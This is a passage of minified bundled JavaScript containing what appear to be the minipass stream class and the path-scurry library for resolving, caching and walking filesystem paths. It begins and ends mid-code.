xK{src;dest;opts;ondrain;constructor(X,Q,J){this.src=X,this.dest=Q,this.opts=J,this.ondrain=()=>X[i5](),this.dest.on("drain",this.ondrain)}unpipe(){this.dest.removeListener("drain",this.ondrain)}proxyErrors(X){}end(){if(this.unpipe(),this.opts.end)this.dest.end()}}var zC,Wt1=(X)=>!!X&&typeof X==="object"&&(X instanceof O7||X instanceof BC||Gt1(X)||Ht1(X)),Gt1=(X)=>!!X&&typeof X==="object"&&X instanceof vK&&typeof X.pipe==="function"&&X.pipe!==BC.Writable.prototype.pipe,Ht1=(X)=>!!X&&typeof X==="object"&&X instanceof vK&&typeof X.write==="function"&&typeof X.end==="function",m8,u8,EX,yW,aQ,gW,UC,mW,KC,h6,d5,z9,oQ,i5,U9,b9,K9,EK,uW,w9,o0,TK,_K,VC,kK,$8,bK,cW,sQ,F7,s9,tQ=(X)=>Promise.resolve().then(X),$t1=(X)=>X(),zt1=(X)=>X==="end"||X==="finish"||X==="prefinish",Ut1=(X)=>X instanceof ArrayBuffer||!!X&&typeof X==="object"&&X.constructor&&X.constructor.name==="ArrayBuffer"&&X.byteLength>=0,Kt1=(X)=>!Buffer.isBuffer(X)&&ArrayBuffer.isView(X),qC,Vt1=(X)=>!!X.objectMode,Bt1=(X)=>!X.objectMode&&!!X.encoding&&X.encoding!=="buffer",O7;var fK=$1(()=>{zC=typeof process==="object"&&process?process:{stdout:null,stderr:null},m8=Symbol("EOF"),u8=Symbol("maybeEmitEnd"),EX=Symbol("emittedEnd"),yW=Symbol("emittingEnd"),aQ=Symbol("emittedError"),gW=Symbol("closed"),UC=Symbol("read"),mW=Symbol("flush"),KC=Symbol("flushChunk"),h6=Symbol("encoding"),d5=Symbol("decoder"),z9=Symbol("flowing"),oQ=Symbol("paused"),i5=Symbol("resume"),U9=Symbol("buffer"),b9=Symbol("pipes"),K9=Symbol("bufferLength"),EK=Symbol("bufferPush"),uW=Symbol("bufferShift"),w9=Symbol("objectMode"),o0=Symbol("destroyed"),TK=Symbol("error"),_K=Symbol("emitData"),VC=Symbol("emitEnd"),kK=Symbol("emitEnd2"),$8=Symbol("async"),bK=Symbol("abort"),cW=Symbol("aborted"),sQ=Symbol("signal"),F7=Symbol("dataListeners"),s9=Symbol("discarded");qC=class qC extends xK{unpipe(){this.src.removeListener("error",this.proxyErrors),super.unpipe()}constructor(X,Q,J){super(X,Q,J);this.proxyErrors=(Y)=>Q.emit("error",Y),X.on("error",this.proxyErrors)}};O7=class O7 extends vK{[z9]=!1;[oQ]=!1;[b9]=[];[U9]=[];[w9];[h6];[$8];[d5];[m8]=!1;[EX]=!1;[yW]=!1;[gW]=!1;[aQ]=null;[K9]=0;[o0]=!1;[sQ];[cW]=!1;[F7]=0;[s9]=!1;writable=!0;readable=!0;constructor(...X){let Q=X[0]||{};super();if(Q.objectMode&&typeof Q.encoding==="string")throw TypeError("Encoding and objectMode may not be used together");if(Vt1(Q))this[w9]=!0,this[h6]=null;else if(Bt1(Q))this[h6]=Q.encoding,this[w9]=!1;else this[w9]=!1,this[h6]=null;if(this[$8]=!!Q.async,this[d5]=this[h6]?new Yt1(this[h6]):null,Q&&Q.debugExposeBuffer===!0)Object.defineProperty(this,"buffer",{get:()=>this[U9]});if(Q&&Q.debugExposePipes===!0)Object.defineProperty(this,"pipes",{get:()=>this[b9]});let{signal:J}=Q;if(J)if(this[sQ]=J,J.aborted)this[bK]();else J.addEventListener("abort",()=>this[bK]())}get bufferLength(){return this[K9]}get encoding(){return this[h6]}set encoding(X){throw Error("Encoding must be set at instantiation time")}setEncoding(X){throw Error("Encoding must be set at instantiation time")}get objectMode(){return this[w9]}set objectMode(X){throw Error("objectMode must be set at instantiation time")}get["async"](){return this[$8]}set["async"](X){this[$8]=this[$8]||!!X}[bK](){this[cW]=!0,this.emit("abort",this[sQ]?.reason),this.destroy(this[sQ]?.reason)}get aborted(){return this[cW]}set aborted(X){}write(X,Q,J){if(this[cW])return!1;if(this[m8])throw Error("write after end");if(this[o0])return this.emit("error",Object.assign(Error("Cannot call write after a stream was destroyed"),{code:"ERR_STREAM_DESTROYED"})),!0;if(typeof Q==="function")J=Q,Q="utf8";if(!Q)Q="utf8";let Y=this[$8]?tQ:$t1;if(!this[w9]&&!Buffer.isBuffer(X)){if(Kt1(X))X=Buffer.from(X.buffer,X.byteOffset,X.byteLength);else if(Ut1(X))X=Buffer.from(X);else if(typeof X!=="string")throw Error("Non-contiguous data written to non-objectMode stream")}if(this[w9]){if(this[z9]&&this[K9]!==0)this[mW](!0);if(this[z9])this.emit("data",X);else this[EK](X);if(this[K9]!==0)this.emit("readable");if(J)Y(J);return this[z9]}if(!X.length){if(this[K9]!==0)this.emit("readable");if(J)Y(J);return this[z9]}if(typeof X==="string"&&!(Q===this[h6]&&!this[d5]?.lastNeed))X=Buffer.from(X,Q);if(Buffer.isBuffer(X)&&this[h6])X=this[d5].write(X);if(this[z9]&&this[K9]!==0)this[mW](!0);if(this[z9])this.emit("data",X);else this[EK](X);if(this[K9]!==0)this.emit("readable");if(J)Y(J);return this[z9]}read(X){if(this[o0])return null;if(this[s9]=!1,this[K9]===0||X===0||X&&X>this[K9])return this[u8](),null;if(this[w9])X=null;if(this[U9].length>1&&!this[w9])this[U9]=[this[h6]?this[U9].join(""):Buffer.concat(this[U9],this[K9])];let Q=this[UC](X||null,this[U9][0]);return this[u8](),Q}[UC](X,Q){if(this[w9])this[uW]();else{let J=Q;if(X===J.length||X===null)this[uW]();else if(typeof J==="string")this[U9][0]=J.slice(X),Q=J.slice(0,X),this[K9]-=X;else this[U9][0]=J.subarray(X),Q=J.subarray(0,X),this[K9]-=X}if(this.emit("data",Q),!this[U9].length&&!this[m8])this.emit("drain");return Q}end(X,Q,J){if(typeof X==="function")J=X,X=void 0;if(typeof Q==="function")J=Q,Q="utf8";if(X!==void 0)this.write(X,Q);if(J)this.once("end",J);if(this[m8]=!0,this.writable=!1,this[z9]||!this[oQ])this[u8]();return this}[i5](){if(this[o0])return;if(!this[F7]&&!this[b9].length)this[s9]=!0;if(this[oQ]=!1,this[z9]=!0,this.emit("resume"),this[U9].length)this[mW]();else if(this[m8])this[u8]();else this.emit("drain")}resume(){return this[i5]()}pause(){this[z9]=!1,this[oQ]=!0,this[s9]=!1}get destroyed(){return this[o0]}get flowing(){return this[z9]}get paused(){return this[oQ]}[EK](X){if(this[w9])this[K9]+=1;else this[K9]+=X.length;this[U9].push(X)}[uW](){if(this[w9])this[K9]-=1;else this[K9]-=this[U9][0].length;return this[U9].shift()}[mW](X=!1){do;while(this[KC](this[uW]())&&this[U9].length);if(!X&&!this[U9].length&&!this[m8])this.emit("drain")}[KC](X){return this.emit("data",X),this[z9]}pipe(X,Q){if(this[o0])return X;this[s9]=!1;let J=this[EX];if(Q=Q||{},X===zC.stdout||X===zC.stderr)Q.end=!1;else Q.end=Q.end!==!1;if(Q.proxyErrors=!!Q.proxyErrors,J){if(Q.end)X.end()}else if(this[b9].push(!Q.proxyErrors?new xK(this,X,Q):new qC(this,X,Q)),this[$8])tQ(()=>this[i5]());else this[i5]();return X}unpipe(X){let Q=this[b9].find((J)=>J.dest===X);if(Q){if(this[b9].length===1){if(this[z9]&&this[F7]===0)this[z9]=!1;this[b9]=[]}else this[b9].splice(this[b9].indexOf(Q),1);Q.unpipe()}}addListener(X,Q){return this.on(X,Q)}on(X,Q){let J=super.on(X,Q);if(X==="data"){if(this[s9]=!1,this[F7]++,!this[b9].length&&!this[z9])this[i5]()}else if(X==="readable"&&this[K9]!==0)super.emit("readable");else if(zt1(X)&&this[EX])super.emit(X),this.removeAllListeners(X);else if(X==="error"&&this[aQ]){let Y=Q;if(this[$8])tQ(()=>Y.call(this,this[aQ]));else Y.call(this,this[aQ])}return J}removeListener(X,Q){return this.off(X,Q)}off(X,Q){let J=super.off(X,Q);if(X==="data"){if(this[F7]=this.listeners("data").length,this[F7]===0&&!this[s9]&&!this[b9].length)this[z9]=!1}return J}removeAllListeners(X){let Q=super.removeAllListeners(X);if(X==="data"||X===void 0){if(this[F7]=0,!this[s9]&&!this[b9].length)this[z9]=!1}return Q}get emittedEnd(){return this[EX]}[u8](){if(!this[yW]&&!this[EX]&&!this[o0]&&this[U9].length===0&&this[m8]){if(this[yW]=!0,this.emit("end"),this.emit("prefinish"),this.emit("finish"),this[gW])this.emit("close");this[yW]=!1}}emit(X,...Q){let J=Q[0];if(X!=="error"&&X!=="close"&&X!==o0&&this[o0])return!1;else if(X==="data")return!this[w9]&&!J?!1:this[$8]?(tQ(()=>this[_K](J)),!0):this[_K](J);else if(X==="end")return this[VC]();else if(X==="close"){if(this[gW]=!0,!this[EX]&&!this[o0])return!1;let W=super.emit("close");return this.removeAllListeners("close"),W}else if(X==="error"){this[aQ]=J,super.emit(TK,J);let W=!this[sQ]||this.listeners("error").length?super.emit("error",J):!1;return this[u8](),W}else if(X==="resume"){let W=super.emit("resume");return this[u8](),W}else if(X==="finish"||X==="prefinish"){let W=super.emit(X);return this.removeAllListeners(X),W}let Y=super.emit(X,...Q);return this[u8](),Y}[_K](X){for(let J of this[b9])if(J.dest.write(X)===!1)this.pause();let Q=this[s9]?!1:super.emit("data",X);return this[u8](),Q}[VC](){if(this[EX])return!1;return this[EX]=!0,this.readable=!1,this[$8]?(tQ(()=>this[kK]()),!0):this[kK]()}[kK](){if(this[d5]){let Q=this[d5].end();if(Q){for(let J of this[b9])J.dest.write(Q);if(!this[s9])super.emit("data",Q)}}for(let Q of this[b9])Q.end();let X=super.emit("end");return this.removeAllListeners("end"),X}async collect(){let X=Object.assign([],{dataLength:0});if(!this[w9])X.dataLength=0;let Q=this.promise();return this.on("data",(J)=>{if(X.push(J),!this[w9])X.dataLength+=J.length}),await Q,X}async concat(){if(this[w9])throw Error("cannot concat in objectMode");let X=await this.collect();return this[h6]?X.join(""):Buffer.concat(X,X.dataLength)}async promise(){return new Promise((X,Q)=>{this.on(o0,()=>Q(Error("stream destroyed"))),this.on("error",(J)=>Q(J)),this.on("end",()=>X())})}[Symbol.asyncIterator](){this[s9]=!1;let X=!1,Q=async()=>{return this.pause(),X=!0,{value:void 0,done:!0}};return{next:()=>{if(X)return Q();let Y=this.read();if(Y!==null)return Promise.resolve({done:!1,value:Y});if(this[m8])return Q();let W,G,H=(K)=>{this.off("data",$),this.off("end",z),this.off(o0,U),Q(),G(K)},$=(K)=>{this.off("error",H),this.off("end",z),this.off(o0,U),this.pause(),W({value:K,done:!!this[m8]})},z=()=>{this.off("error",H),this.off("data",$),this.off(o0,U),Q(),W({done:!0,value:void 0})},U=()=>H(Error("stream destroyed"));return new Promise((K,B)=>{G=B,W=K,this.once(o0,U),this.once("error",H),this.once("end",z),this.once("data",$)})},throw:Q,return:Q,[Symbol.asyncIterator](){return this}}}[Symbol.iterator](){this[s9]=!1;let X=!1,Q=()=>{return this.pause(),this.off(TK,Q),this.off(o0,Q),this.off("end",Q),X=!0,{done:!0,value:void 0}},J=()=>{if(X)return Q();let Y=this.read();return Y===null?Q():{done:!1,value:Y}};return this.once("end",Q),this.once(TK,Q),this.once(o0,Q),{next:J,throw:Q,return:Q,[Symbol.iterator](){return this}}}destroy(X){if(this[o0]){if(X)this.emit("error",X);else this.emit(o0);return this}this[o0]=!0,this[s9]=!0,this[U9].length=0,this[K9]=0;let Q=this;if(typeof Q.close==="function"&&!this[gW])Q.close();if(X)this.emit("error",X);else this.emit(o0);return this}static get isStream(){return Wt1}}});import{posix as qt1,win32 as gK}from"node:path";import{fileURLToPath as Zt1}from"node:url";import{lstatSync as Mt1,readdir as jt1,readdirSync as Ft1,readlinkSync as Ot1,realpathSync as At1}from"fs";import*as Rt1 from"node:fs";import{lstat as Dt1,readdir as Nt1,readlink as wt1,realpath as It1}from"node:fs/promises";var Lt1,XJ,OC=(X)=>!X||X===XJ||X===Rt1?XJ:{...XJ,...X,promises:{...XJ.promises,...X.promises||{}}},AC,Ct1=(X)=>X.replace(/\//g,"\\").replace(AC,"$1\\"),Pt1,M6=0,RC=1,LC=2,z8=4,DC=6,NC=8,A7=10,wC=12,Z6=15,eQ,hK=16,ZC=32,QJ=64,y6=128,lW=256,dW=512,MC,St1=1023,yK=(X)=>X.isFile()?NC:X.isDirectory()?z8:X.isSymbolicLink()?A7:X.isCharacterDevice()?LC:X.isBlockDevice()?DC:X.isSocket()?wC:X.isFIFO()?RC:M6,jC,JJ=(X)=>{let Q=jC.get(X);if(Q)return Q;let J=X.normalize("NFKD");return jC.set(X,J),J},FC,pW=(X)=>{let Q=FC.get(X);if(Q)return Q;let J=JJ(X.toLowerCase());return FC.set(X,J),J},mK,IC,CC,v9,iW,rW,uK,YJ,WJ,nW,vK0,PC;var SC=$1(()=>{$C();fK();Lt1=At1.native,XJ={lstatSync:Mt1,readdir:jt1,readdirSync:Ft1,readlinkSync:Ot1,realpathSync:Lt1,promises:{lstat:Dt1,readdir:Nt1,readlink:wt1,realpath:It1}},AC=/^\\\\\?\\([a-z]:)\\?$/i,Pt1=/[\\\/]/,eQ=~Z6,MC=QJ|y6|dW,jC=new Map,FC=new Map;mK=class mK extends nQ{constructor(){super({max:256})}};IC=class IC extends nQ{constructor(X=16384){super({maxSize:X,sizeCalculation:(Q)=>Q.length+1})}};CC=Symbol("PathScurry setAsCwd");v9=class v9{name;root;roots;parent;nocase;isCWD=!1;#X;#Q;get dev(){return this.#Q}#G;get mode(){return this.#G}#W;get nlink(){return this.#W}#H;get uid(){return this.#H}#R;get gid(){return this.#R}#O;get rdev(){return this.#O}#K;get blksize(){return this.#K}#$;get ino(){return this.#$}#B;get size(){return this.#B}#V;get blocks(){return this.#V}#z;get atimeMs(){return this.#z}#J;get mtimeMs(){return this.#J}#Z;get ctimeMs(){return this.#Z}#L;get birthtimeMs(){return this.#L}#A;get atime(){return this.#A}#M;get mtime(){return this.#M}#S;get ctime(){return this.#S}#j;get birthtime(){return this.#j}#N;#C;#F;#D;#P;#q;#Y;#b;#E;#w;get parentPath(){return(this.parent||this).fullpath()}get path(){return this.parentPath}constructor(X,Q=M6,J,Y,W,G,H){if(this.name=X,this.#N=W?pW(X):JJ(X),this.#Y=Q&St1,this.nocase=W,this.roots=Y,this.root=J||this,this.#b=G,this.#F=H.fullpath,this.#P=H.relative,this.#q=H.relativePosix,this.parent=H.parent,this.parent)this.#X=this.parent.#X;else this.#X=OC(H.fs)}depth(){if(this.#C!==void 0)return this.#C;if(!this.parent)return this.#C=0;return this.#C=this.parent.depth()+1}childrenCache(){return this.#b}resolve(X){if(!X)return this;let Q=this.getRootString(X),Y=X.substring(Q.length).split(this.splitSep);return Q?this.getRoot(Q).#u(Y):this.#u(Y)}#u(X){let Q=this;for(let J of X)Q=Q.child(J);return Q}children(){let X=this.#b.get(this);if(X)return X;let Q=Object.assign([],{provisional:0});return this.#b.set(this,Q),this.#Y&=~hK,Q}child(X,Q){if(X===""||X===".")return this;if(X==="..")return this.parent||this;let J=this.children(),Y=this.nocase?pW(X):JJ(X);for(let $ of J)if($.#N===Y)return $;let W=this.parent?this.sep:"",G=this.#F?this.#F+W+X:void 0,H=this.newChild(X,M6,{...Q,parent:this,fullpath:G});if(!this.canReaddir())H.#Y|=y6;return J.push(H),H}relative(){if(this.isCWD)return"";if(this.#P!==void 0)return this.#P;let X=this.name,Q=this.parent;if(!Q)return this.#P=this.name;let J=Q.relative();return J+(!J||!Q.parent?"":this.sep)+X}relativePosix(){if(this.sep==="/")return this.relative();if(this.isCWD)return"";if(this.#q!==void 0)return this.#q;let X=this.name,Q=this.parent;if(!Q)return this.#q=this.fullpathPosix();let J=Q.relativePosix();return J+(!J||!Q.parent?"":"/")+X}fullpath(){if(this.#F!==void 0)return this.#F;let X=this.name,Q=this.parent;if(!Q)return this.#F=this.name;let Y=Q.fullpath()+(!Q.parent?"":this.sep)+X;return this.#F=Y}fullpathPosix(){if(this.#D!==void 0)return this.#D;if(this.sep==="/")return this.#D=this.fullpath();if(!this.parent){let Y=this.fullpath().replace(/\\/g,"/");if(/^[a-z]:\//i.test(Y))return this.#D=`//?/${Y}`;else return this.#D=Y}let X=this.parent,Q=X.fullpathPosix(),J=Q+(!Q||!X.parent?"":"/")+this.name;return this.#D=J}isUnknown(){return(this.#Y&Z6)===M6}isType(X){return this[`is${X}`]()}getType(){return this.isUnknown()?"Unknown":this.isDirectory()?"Directory":this.isFile()?"File":this.isSymbolicLink()?"SymbolicLink":this.isFIFO()?"FIFO":this.isCharacterDevice()?"CharacterDevice":this.isBlockDevice()?"BlockDevice":this.isSocket()?"Socket":"Unknown"}isFile(){return(this.#Y&Z6)===NC}isDirectory(){return(this.#Y&Z6)===z8}isCharacterDevice(){return(this.#Y&Z6)===LC}isBlockDevice(){return(this.#Y&Z6)===DC}isFIFO(){return(this.#Y&Z6)===RC}isSocket(){return(this.#Y&Z6)===wC}isSymbolicLink(){return(this.#Y&A7)===A7}lstatCached(){return this.#Y&ZC?this:void 0}readlinkCached(){return this.#E}realpathCached(){return this.#w}readdirCached(){let X=this.children();return X.slice(0,X.provisional)}canReadlink(){if(this.#E)return!0;if(!this.parent)return!1;let X=this.#Y&Z6;return!(X!==M6&&X!==A7||this.#Y&lW||this.#Y&y6)}calledReaddir(){return!!(this.#Y&hK)}isENOENT(){return!!(this.#Y&y6)}isNamed(X){return!this.nocase?this.#N===JJ(X):this.#N===pW(X)}async readlink(){let X=this.#E;if(X)return X;if(!this.canReadlink())return;if(!this.parent)return;try{let Q=await this.#X.promises.readlink(this.fullpath()),J=(await this.parent.realpath())?.resolve(Q);if(J)return this.#E=J}catch(Q){this.#c(Q.code);return}}readlinkSync(){let X=this.#E;if(X)return X;if(!this.canReadlink())return;if(!this.parent)return;try{let Q=this.#X.readlinkSync(this.fullpath()),J=this.parent.realpathSync()?.resolve(Q);if(J)return this.#E=J}catch(Q){this.#c(Q.code);return}}#I(X){this.#Y|=hK;for(let Q=X.provisional;Q<X.length;Q++){let J=X[Q];if(J)J.#y()}}#y(){if(this.#Y&y6)return;this.#Y=(this.#Y|y6)&eQ,this.#v()}#v(){let X=this.children();X.provisional=0;for(let Q of X)Q.#y()}#g(){this.#Y|=dW,this.#x()}#x(){if(this.#Y&QJ)return;let X=this.#Y;if((X&Z6)===z8)X&=eQ;this.#Y=X|QJ,this.#v()}#T(X=""){if(X==="ENOTDIR"||X==="EPERM")this.#x();else if(X==="ENOENT")this.#y();else this.children().provisional=0}#k(X=""){if(X==="ENOTDIR")this.parent.#x();else if(X==="ENOENT")this.#y()}#c(X=""){let Q=this.#Y;if(Q|=lW,X==="ENOENT")Q|=y6;if(X==="EINVAL"||X==="UNKNOWN")Q&=eQ;if(this.#Y=Q,X==="ENOTDIR"&&this.parent)this.parent.#x()}#f(X,Q){return this.#U(X,Q)||this.#l(X,Q)}#l(X,Q){let J=yK(X),Y=this.newChild(X.name,J,{parent:this}),W=Y.#Y&Z6;if(W!==z8&&W!==A7&&W!==M6)Y.#Y|=QJ;return Q.unshift(Y),Q.provisional++,Y}#U(X,Q){for(let J=Q.provisional;J<Q.length;J++){let Y=Q[J];if((this.nocase?pW(X.name):JJ(X.name))!==Y.#N)continue;return this.#p(X,Y,J,Q)}}#p(X,Q,J,Y){let W=Q.name;if(Q.#Y=Q.#Y&eQ|yK(X),W!==X.name)Q.name=X.name;if(J!==Y.provisional){if(J===Y.length-1)Y.pop();else Y.splice(J,1);Y.unshift(Q)}return Y.provisional++,Q}async lstat(){if((this.#Y&y6)===0)try{return this.#h(await this.#X.promises.lstat(this.fullpath())),this}catch(X){this.#k(X.code)}}lstatSync(){if((this.#Y&y6)===0)try{return this.#h(this.#X.lstatSync(this.fullpath())),this}catch(X){this.#k(X.code)}}#h(X){let{atime:Q,atimeMs:J,birthtime:Y,birthtimeMs:W,blksize:G,blocks:H,ctime:$,ctimeMs:z,dev:U,gid:K,ino:B,mode:q,mtime:Z,mtimeMs:M,nlink:L,rdev:R,size:j,uid:F}=X;this.#A=Q,this.#z=J,this.#j=Y,this.#L=W,this.#K=G,this.#V=H,this.#S=$,this.#Z=z,this.#Q=U,this.#R=K,this.#$=B,this.#G=q,this.#M=Z,this.#J=M,this.#W=L,this.#O=R,this.#B=j,this.#H=F;let A=yK(X);if(this.#Y=this.#Y&eQ|A|ZC,A!==M6&&A!==z8&&A!==A7)this.#Y|=QJ}#_=[];#m=!1;#i(X){this.#m=!1;let Q=this.#_.slice();this.#_.length=0,Q.forEach((J)=>J(null,X))}readdirCB(X,Q=!1){if(!this.canReaddir()){if(Q)X(null,[]);else queueMicrotask(()=>X(null,[]));return}let J=this.children();if(this.calledReaddir()){let W=J.slice(0,J.provisional);if(Q)X(null,W);else queueMicrotask(()=>X(null,W));return}if(this.#_.push(X),this.#m)return;this.#m=!0;let Y=this.fullpath();this.#X.readdir(Y,{withFileTypes:!0},(W,G)=>{if(W)this.#T(W.code),J.provisional=0;else{for(let H of G)this.#f(H,J);this.#I(J)}this.#i(J.slice(0,J.provisional));return})}#d;async readdir(){if(!this.canReaddir())return[];let X=this.children();if(this.calledReaddir())return X.slice(0,X.provisional);let Q=this.fullpath();if(this.#d)await this.#d;else{let J=()=>{};this.#d=new Promise((Y)=>J=Y);try{for(let Y of await this.#X.promises.readdir(Q,{withFileTypes:!0}))this.#f(Y,X);this.#I(X)}catch(Y){this.#T(Y.code),X.provisional=0}this.#d=void 0,J()}return X.slice(0,X.provisional)}readdirSync(){if(!this.canReaddir())return[];let X=this.children();if(this.calledReaddir())return X.slice(0,X.provisional);let Q=this.fullpath();try{for(let J of this.#X.readdirSync(Q,{withFileTypes:!0}))this.#f(J,X);this.#I(X)}catch(J){this.#T(J.code),X.provisional=0}return X.slice(0,X.provisional)}canReaddir(){if(this.#Y&MC)return!1;let X=Z6&this.#Y;if(!(X===M6||X===z8||X===A7))return!1;return!0}shouldWalk(X,Q){return(this.#Y&z8)===z8&&!(this.#Y&MC)&&!X.has(this)&&(!Q||Q(this))}async realpath(){if(this.#w)return this.#w;if((dW|lW|y6)&this.#Y)return;try{let X=await this.#X.promises.realpath(this.fullpath());return this.#w=this.resolve(X)}catch(X){this.#g()}}realpathSync(){if(this.#w)return this.#w;if((dW|lW|y6)&this.#Y)return;try{let X=this.#X.realpathSync(this.fullpath());return this.#w=this.resolve(X)}catch(X){this.#g()}}[CC](X){if(X===this)return;X.isCWD=!1,this.isCWD=!0;let Q=new Set([]),J=[],Y=this;while(Y&&Y.parent)Q.add(Y),Y.#P=J.join(this.sep),Y.#q=J.join("/"),Y=Y.parent,J.push("..");Y=X;while(Y&&Y.parent&&!Q.has(Y))Y.#P=void 0,Y.#q=void 0,Y=Y.parent}};iW=class iW extends v9{sep="\\";splitSep=Pt1;constructor(X,Q=M6,J,Y,W,G,H){super(X,Q,J,Y,W,G,H)}newChild(X,Q=M6,J={}){return new iW(X,Q,this.root,this.roots,this.nocase,this.childrenCache(),J)}getRootString(X){return gK.parse(X).root}getRoot(X){if(X=Ct1(X.toUpperCase()),X===this.root.name)return this.root;for(let[Q,J]of Object.entries(this.roots))if(this.sameRoot(X,Q))return this.roots[X]=J;return this.roots[X]=new YJ(X,this).root}sameRoot(X,Q=this.root.name){return X=X.toUpperCase().replace(/\//g,"\\").replace(AC,"$1\\"),X===Q}};rW=class rW extends v9{splitSep="/";sep="/";constructor(X,Q=M6,J,Y,W,G,H){super(X,Q,J,Y,W,G,H)}getRootString(X){return X.startsWith("/")?"/":""}getRoot(X){return this.root}newChild(X,Q=M6,J={}){return new rW(X,Q,this.root,this.roots,this.nocase,this.childrenCache(),J)}};uK=class uK{root;rootPath;roots;cwd;#X;#Q;#G;nocase;#W;constructor(X=process.cwd(),Q,J,{nocase:Y,childrenCacheSize:W=16384,fs:G=XJ}={}){if(this.#W=OC(G),X instanceof URL||X.startsWith("file://"))X=Zt1(X);let H=Q.resolve(X);this.roots=Object.create(null),this.rootPath=this.parseRootPath(H),this.#X=new mK,this.#Q=new mK,this.#G=new IC(W);let $=H.substring(this.rootPath.length).split(J);if($.length===1&&!$[0])$.pop();if(Y===void 0)throw TypeError("must provide nocase setting to PathScurryBase ctor");this.nocase=Y,this.root=this.newRoot(this.#W),this.roots[this.rootPath]=this.root;let z=this.root,U=$.length-1,K=Q.sep,B=this.rootPath,q=!1;for(let Z of $){let M=U--;z=z.child(Z,{relative:Array(M).fill("..").join(K),relativePosix:Array(M).fill("..").join("/"),fullpath:B+=(q?"":K)+Z}),q=!0}this.cwd=z}depth(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.depth()}childrenCache(){return this.#G}resolve(...X){let Q="";for(let W=X.length-1;W>=0;W--){let G=X[W];if(!G||G===".")continue;if(Q=Q?`${G}/${Q}`:G,this.isAbsolute(G))break}let J=this.#X.get(Q);if(J!==void 0)return J;let Y=this.cwd.resolve(Q).fullpath();return this.#X.set(Q,Y),Y}resolvePosix(...X){let Q="";for(let W=X.length-1;W>=0;W--){let G=X[W];if(!G||G===".")continue;if(Q=Q?`${G}/${Q}`:G,this.isAbsolute(G))break}let J=this.#Q.get(Q);if(J!==void 0)return J;let Y=this.cwd.resolve(Q).fullpathPosix();return this.#Q.set(Q,Y),Y}relative(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.relative()}relativePosix(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.relativePosix()}basename(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.name}dirname(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return(X.parent||X).fullpath()}async readdir(X=this.cwd,Q={withFileTypes:!0}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X,X=this.cwd;let{withFileTypes:J}=Q;if(!X.canReaddir())return[];else{let Y=await X.readdir();return J?Y:Y.map((W)=>W.name)}}readdirSync(X=this.cwd,Q={withFileTypes:!0}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X,X=this.cwd;let{withFileTypes:J=!0}=Q;if(!X.canReaddir())return[];else if(J)return X.readdirSync();else return X.readdirSync().map((Y)=>Y.name)}async lstat(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.lstat()}lstatSync(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.lstatSync()}async readlink(X=this.cwd,{withFileTypes:Q}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X.withFileTypes,X=this.cwd;let J=await X.readlink();return Q?J:J?.fullpath()}readlinkSync(X=this.cwd,{withFileTypes:Q}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X.withFileTypes,X=this.cwd;let J=X.readlinkSync();return Q?J:J?.fullpath()}async realpath(X=this.cwd,{withFileTypes:Q}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X.withFileTypes,X=this.cwd;let J=await X.realpath();return Q?J:J?.fullpath()}realpathSync(X=this.cwd,{withFileTypes:Q}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X.withFileTypes,X=this.cwd;let J=X.realpathSync();return Q?J:J?.fullpath()}async walk(X=this.cwd,Q={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X,X=this.cwd;let{withFileTypes:J=!0,follow:Y=!1,filter:W,walkFilter:G}=Q,H=[];if(!W||W(X))H.push(J?X:X.fullpath());let $=new Set,z=(K,B)=>{$.add(K),K.readdirCB((q,Z)=>{if(q)return B(q);let M=Z.length;if(!M)return B();let L=()=>{if(--M===0)B()};for(let R of Z){if(!W||W(R))H.push(J?R:R.fullpath());if(Y&&R.isSymbolicLink())R.realpath().then((j)=>j?.isUnknown()?j.lstat():j).then((j)=>j?.shouldWalk($,G)?z(j,L):L());else if(R.shouldWalk($,G))z(R,L);else L()}},!0)},U=X;return new Promise((K,B)=>{z(U,(q)=>{if(q)return B(q);K(H)})})}walkSync(X=this.cwd,Q={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X,X=this.cwd;let{withFileTypes:J=!0,follow:Y=!1,filter:W,walkFilter:G}=Q,H=[];if(!W||W(X))H.push(J?X:X.fullpath());let $=new Set([X]);for(let z of $){let U=z.readdirSync();for(let K of U){if(!W||W(K))H.push(J?K:K.fullpath());let B=K;if(K.isSymbolicLink()){if(!(Y&&(B=K.realpathSync())))continue;if(B.isUnknown())B.lstatSync()}if(B.shouldWalk($,G))$.add(B)}}return H}[Symbol.asyncIterator](){return this.iterate()}iterate(X=this.cwd,Q={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X,X=this.cwd;return this.stream(X,Q)[Symbol.asyncIterator]()}[Symbol.iterator](){return this.iterateSync()}*iterateSync(X=this.cwd,Q={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X,X=this.cwd;let{withFileTypes:J=!0,follow:Y=!1,filter:W,walkFilter:G}=Q;if(!W||W(X))yield J?X:X.fullpath();let H=new Set([X]);for(let $ of H){let z=$.readdirSync();for(let U of z){if(!W||W(U))yield J?U:U.fullpath();let K=U;if(U.isSymbolicLink()){if(!(Y&&(K=U.realpathSync())))continue;if(K.isUnknown())K.lstatSync()}if(K.shouldWalk(H,G))H.add(K)}}}stream(X=this.cwd,Q={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof v9))Q=X,X=this.cwd;let{withFileTypes:J=!0,follow:Y=!1,filter:W,walkFilter:G}=Q,H=new O7({objectMode:!0});if(!W||W(X))H.write(J?X:X.fullpath());let $=new Set,z=[X],U=0,K=()=>{let B=!1;while(!B){let 